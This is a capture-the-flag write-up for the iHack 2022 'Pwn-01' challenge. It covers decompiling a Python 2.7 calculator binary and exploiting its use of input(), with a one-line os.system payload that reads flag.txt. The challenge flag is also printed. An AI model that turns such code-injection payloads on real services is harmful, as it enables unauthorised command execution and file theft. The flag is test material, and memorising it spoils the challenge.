# Pwn-01

> **Flag Format:** `ihack{MD5}`
>
> **Remote Instance:** `nc pwn1.ihack.sibersiaga.my 80`

### Solution

The binary is a compiled python executable. The original binary was corrupted.

```
┌──(kali💀JesusCries)-[~/Desktop/iHack/pwn/pwn-01]
└─$ file calculator_
calculator_: python 2.7 byte-compiled
```

Fix the file format by changing the extension to `.pyc`.

```
┌──(kali💀JesusCries)-[~/Desktop/iHack/pwn/pwn-01]
└─$ mv calculator_ calculator.pyc
```

The python byte-code executable can be decompiled using `decompyle6`, `pycdc` or by using this [Online Compiler](https://www.toolnb.com/tools-lang-en/pyc.html).

```
┌──(kali💀JesusCries)-[~/Desktop/iHack/pwn/pwn-01]
└─$ cat calculator.py 

# uncompyle6 version 3.5.0
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.5 (default, Jun 28 2022, 15:30:04) 
# [GCC 4.8.5 20150623 (Red Hat 4.8.5-44)]
# Embedded file name: calculator.py
# Compiled at: 2022-12-09 16:17:40

import sys
print 'Welcome to IHACK2022. \nThis python program will calculate the prime numbers up to a given number.\nPlease enter a number to be calculated'
sys.stdout.flush()
number = input('')
sys.stdout.flush()
number = int(number)

def is_prime(number):
    if number <= 1:
        return False
    for i in range(2, number):
        if number % i == 0:
            return False

    return True


def print_primes(number):
    for i in range(1, number + 1):
        if is_prime(i):
            print i


print 'The prime numbers up to', number, 'are:'
sys.stdout.flush()
print_primes(number)                     
```

The code uses input function which take any input as literal python code. Therefore, we can get RCE using the shell command `import('os').system("cat flag.txt")`.

**Flag:** `ihack{ebd4e5f19d80a8f40b58a7abba5363a0}`

